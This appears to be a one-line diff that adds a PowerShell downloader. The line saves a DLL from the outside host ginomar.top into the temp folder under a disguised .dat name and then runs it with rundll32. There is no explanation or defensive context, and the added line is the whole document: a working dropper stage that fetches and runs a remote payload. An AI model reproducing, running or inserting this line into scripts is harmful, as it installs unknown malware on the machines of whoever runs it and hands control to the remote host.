@@ -1,0 +1,1 @@
+$path = $Env:temp+'\QMURIaJ.dat'; $client = New-Object System.Net.WebClient; $client.downloadfile('http://ginomar.top/dll/626262.dll',$path); C:\Windows\System32\rundll32.exe $path,ping
